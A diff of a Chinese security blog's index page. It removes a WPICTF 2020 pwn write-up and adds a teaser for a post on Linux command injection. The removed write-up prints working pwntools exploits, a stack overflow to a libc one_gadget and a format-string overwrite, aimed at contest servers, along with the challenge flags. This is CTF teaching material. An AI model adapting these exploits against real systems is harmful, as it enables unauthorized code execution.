@@ -442,122 +442,6 @@
 
 
   
-    <article id="post-【WriteUp】WPICTF 2020 -- Pwn 题解" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="2020/04/18/【WriteUp】WPICTF 2020 -- Pwn 题解/" class="article-date">
-      <time datetime="2020-04-18T10:56:25.983Z" itemprop="datePublished">2020-04-18</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="2020/04/18/【WriteUp】WPICTF 2020 -- Pwn 题解/">【WriteUp】WPICTF 2020 -- Pwn 题解</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <a id="more"></a>
-
-<h2 id="dorsia1"><a href="#dorsia1" class="headerlink" title="dorsia1"></a>dorsia1</h2><h3 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
-<p><a href="http://us-east-1.linodeobjects.com/wpictf-challenge-files/dorsia.webm" target="_blank" rel="noopener">http://us-east-1.linodeobjects.com/wpictf-challenge-files/dorsia.webm</a> The first card.<br><br>nc dorsia1.wpictf.xyz 31337 or 31338 or 31339<br><br>made by: awg<br><br>Hint: Same libc as dorsia4, but you shouldn’t need the file to solve.</p>
-</blockquote>
-<hr>
-<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution:"></a>Solution:</h3><p>给了个视频，出现了很多写有代码的纸片，其中第一张纸片的代码如下：</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> a[<span class="number">69</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, system + <span class="number">765772</span>);</span><br><span class="line">    fgets(a, <span class="number">96</span>, <span class="built_in">stdin</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>根据代码，推断是简单的栈溢出，无防护的那种，之后顺利提权</p>
-<p><strong>exp 如下：</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> easyLibc <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">"amd64"</span>, endian=<span class="string">'el'</span>, os=<span class="string">"linux"</span>)</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">p = remote(<span class="string">'dorsia1.wpictf.xyz'</span>, <span class="number">31337</span>)</span><br><span class="line">libc_one_gadget = [<span class="number">0x4f2c5</span>, <span class="number">0x4f322</span>, <span class="number">0x10a38c</span>]</span><br><span class="line"></span><br><span class="line">addr_system = int(p.recv(<span class="number">14</span>), <span class="number">16</span>) - <span class="number">765772</span></span><br><span class="line"><span class="comment"># libc6_2.27-3ubuntu1_amd64.so</span></span><br><span class="line">libc = easyLibc(<span class="string">'system'</span>, addr_system, <span class="number">1</span>)</span><br><span class="line">libcbase = addr_system - libc.dump(<span class="string">'system'</span>)</span><br><span class="line">addr_one_gadget = libcbase + libc_one_gadget[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">pd = <span class="string">'a'</span> * <span class="number">0x4d</span></span><br><span class="line">pd += p64(addr_one_gadget)</span><br><span class="line">p.sendline(pd)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WPI&#123;FEED_ME_A_STRAY_CAT&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="dont-me"><a href="#dont-me" class="headerlink" title="dont@me"></a>dont@me</h2><h3 id="Description-1"><a href="#Description-1" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
-<p>CURRENTLY BROKEN. WORKING ON A FIX. WILL ANNOUNCE. Binary appears to be fine, but out tweet-fetcher is broken.<br><br>tweet @JohnSmi31885382<br><br>made by: rm -k</p>
-</blockquote>
-<hr>
-<h3 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution:"></a>Solution:</h3><p>程序保护如下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
-
-<p><strong>exp 如下：</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<hr>
-<h3 id="Flag-1"><a href="#Flag-1" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">动态靶机</span><br></pre></td></tr></table></figure>
-
-<h2 id="dorsia3"><a href="#dorsia3" class="headerlink" title="dorsia3"></a>dorsia3</h2><h3 id="Description-2"><a href="#Description-2" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
-<p><a href="http://us-east-1.linodeobjects.com/wpictf-challenge-files/dorsia.webm" target="_blank" rel="noopener">http://us-east-1.linodeobjects.com/wpictf-challenge-files/dorsia.webm</a> The third card.<br><br>nc dorsia3.wpictf.xyz 31337 or 31338 or 31339<br><br>made by: awg</p>
-</blockquote>
-<hr>
-<h3 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution:"></a>Solution:</h3><p>程序保护如下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
-
-<p><strong>main 函数如下：</strong></p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> a[<span class="number">69</span>]; <span class="comment">// [esp+1h] [ebp-5Dh]</span></span><br><span class="line">  <span class="keyword">int</span> *v5; <span class="comment">// [esp+52h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = &amp;argc;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%p%p\n"</span>, a, &amp;system - <span class="number">72</span>);</span><br><span class="line">  fgets(a, <span class="number">69</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(a, <span class="string">"%s\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>格式化字符串乱打</p>
-<p><strong>exp 如下：</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">context(arch=<span class="string">"i386"</span>, endian=<span class="string">'el'</span>, os=<span class="string">"linux"</span>)</span><br><span class="line"><span class="comment"># context.log_level = "debug"</span></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">    p = process(<span class="string">'./nanoprint'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'dorsia3.wpictf.xyz'</span>, <span class="number">31337</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">libc_one_gadget = [<span class="number">0x3d0d3</span>, <span class="number">0x3d0d5</span>, <span class="number">0x3d0d9</span>, <span class="number">0x3d0e0</span>, <span class="number">0x67a7f</span>, <span class="number">0x67a80</span>, <span class="number">0x137e5e</span>, <span class="number">0x137e5f</span>]</span><br><span class="line"></span><br><span class="line">addr_stack = int(p.recv(<span class="number">10</span>), <span class="number">16</span>) + <span class="number">0x71</span></span><br><span class="line">addr_system = int(p.recv(<span class="number">10</span>), <span class="number">16</span>) + <span class="number">0x120</span></span><br><span class="line">libcbase = addr_system - libc.sym[<span class="string">'system'</span>]</span><br><span class="line">addr_one_gadget = libcbase + libc_one_gadget[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">success(<span class="string">'addr_stack      = '</span> + hex(addr_stack))</span><br><span class="line">success(<span class="string">'addr_system     = '</span> + hex(addr_system))</span><br><span class="line">success(<span class="string">'addr_one_gadget = '</span> + hex(addr_one_gadget))</span><br><span class="line"><span class="comment"># gdb.attach(p, "b *$rebase(0x10C7)\nc")</span></span><br><span class="line"></span><br><span class="line">pd = fmtstr_payload(<span class="number">7</span>, &#123;addr_stack: addr_one_gadget&#125;, offset_bytes=<span class="number">-1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'\n'</span>, pd)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h3 id="Flag-2"><a href="#Flag-2" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WPI&#123;Th3re_is_an_idea_of_4_Pa7rick_BatemaN&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="dorsia4"><a href="#dorsia4" class="headerlink" title="dorsia4"></a>dorsia4</h2><h3 id="Description-3"><a href="#Description-3" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
-<p><a href="http://us-east-1.linodeobjects.com/wpictf-challenge-files/dorsia.webm" target="_blank" rel="noopener">http://us-east-1.linodeobjects.com/wpictf-challenge-files/dorsia.webm</a> The fourth card.<br><br>nc dorsia4.wpictf.xyz 31337 or 31338 or 31339<br><br>made by: awg</p>
-</blockquote>
-<hr>
-<h3 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution:"></a>Solution:</h3><p>程序保护如下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><strong>exp 如下：</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<hr>
-<h3 id="Flag-3"><a href="#Flag-3" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">动态靶机</span><br></pre></td></tr></table></figure>
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="categories/Pwn/">Pwn</a>
-    </div>
-
-
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
     <article id="post-【Pwn 笔记】IO FILE 利用链汇总" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -932,6 +816,70 @@
       
         <p class="article-more-link">
           <a href="2020/03/26/【Pwn 笔记】Windows Pwn 环境搭建/#more">阅读全文 >></a>
+        </p>
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-【Pwn 笔记】Linux 命令注入一览" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="2020/03/24/【Pwn 笔记】Linux 命令注入一览/" class="article-date">
+      <time datetime="2020-03-23T16:42:00.000Z" itemprop="datePublished">2020-03-23</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="2020/03/24/【Pwn 笔记】Linux 命令注入一览/">【Pwn 笔记】Linux 命令注入一览</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+              <p>骚操作总结，咕咕咕式更新</p>
+          
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="categories/Pwn-笔记/">Pwn 笔记</a>
+    </div>
+
+
+      
+      
+        <p class="article-more-link">
+          <a href="2020/03/24/【Pwn 笔记】Linux 命令注入一览/#more">阅读全文 >></a>
         </p>
       
       <div class="clearfix"></div>
